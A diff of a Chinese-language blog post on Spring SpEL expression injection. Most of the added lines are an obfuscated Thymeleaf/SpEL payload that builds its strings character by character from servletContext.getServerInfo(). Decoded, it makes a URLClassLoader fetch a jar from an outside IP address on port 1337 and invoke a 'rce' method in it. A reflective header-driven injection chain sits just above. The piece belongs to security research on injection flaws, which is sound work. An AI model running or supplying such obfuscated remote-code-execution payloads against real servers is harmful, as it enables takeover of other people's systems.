@@ -88,7 +88,7 @@
             <h1>Java spring SPEL表达式注入</h1>
             <span class="meta">
             	Posted on
-              2020-09-07，5 min read
+              2020-09-07，7 min read
             </span>
           </div>
         </div>
@@ -201,9 +201,13 @@ SPEL也支持</p>
 uest.getHeader(222),#this.getClass().getClassLoader().loadClass(#request.getHeader(333))).invoke(
 #this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#reques
 t.getHeader(444)).invoke(null),#request.getParameter(1))}]]
+
+
+#httpServletRequest.getParameter(1)
+自带的
 </code></pre>
 <p>利用Urlclassload。来创建类。然后new</p>
-<pre><code>New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;}).getDeclaredMethod(&quot;rce&quot;).invoke(null)
+<pre><code>[[${New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL((%23servletContext.getServerInfo()[0].replace(65,104)%2b%23servletContext.getServerInfo()[0].replace(65,116)%2b%23servletContext.getServerInfo()[0].replace(65,116)%2b%23servletContext.getServerInfo()[0].replace(65,112)%2b%23servletContext.getServerInfo()[0].replace(65,58)%2b%23servletContext.getServerInfo()[0].replace(65,47)%2b%23servletContext.getServerInfo()[0].replace(65,47)%2b%23servletContext.getServerInfo()[0].replace(65,49)%2b%23servletContext.getServerInfo()[0].replace(65,46)%2b%23servletContext.getServerInfo()[0].replace(65,49)%2b%23servletContext.getServerInfo()[0].replace(65,53)%2b%23servletContext.getServerInfo()[0].replace(65,46)%2b%23servletContext.getServerInfo()[0].replace(65,54)%2b%23servletContext.getServerInfo()[0].replace(65,55)%2b%23servletContext.getServerInfo()[0].replace(65,46)%2b%23servletContext.getServerInfo()[0].replace(65,49)%2b%23servletContext.getServerInfo()[0].replace(65,52)%2b%23servletContext.getServerInfo()[0].replace(65,50)%2b%23servletContext.getServerInfo()[0].replace(65,58)%2b%23servletContext.getServerInfo()[0].replace(65,49)%2b%23servletContext.getServerInfo()[0].replace(65,51)%2b%23servletContext.getServerInfo()[0].replace(65,51)%2b%23servletContext.getServerInfo()[0].replace(65,55)%2b%23servletContext.getServerInfo()[0].replace(65,47)%2b%23servletContext.getServerInfo()[0].replace(65,49)%2b%23servletContext.getServerInfo()[0].replace(65,46)%2b%23servletContext.getServerInfo()[0].replace(65,106)%2b%23servletContext.getServerInfo()[0].replace(65,97)%2b%23servletContext.getServerInfo()[0].replace(65,114)))}).loadClass(%23servletContext.getServerInfo()[0].replace(65,118)%2b%23servletContext.getServerInfo()[0].replace(65,117)%2b%23servletContext.getServerInfo()[0].replace(65,108)%2b%23servletContext.getServerInfo()[0].replace(65,110)).getDeclaredMethod((%23servletContext.getServerInfo()[0].replace(65,114)%2b%23servletContext.getServerInfo()[0].replace(65,99)%2b%23servletContext.getServerInfo()[0].replace(65,101))).invoke(null)}]]
 </code></pre>
 <h2 id="其他bypass的-可以看httpswwwmi1k7eacom20200110spele8a1a8e8bebee5bc8fe6b3a8e585a5e6bc8fe6b49ee680bbe7bb93先占个坑">其他bypass的。可以看<br>
 <code>https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</code><br>
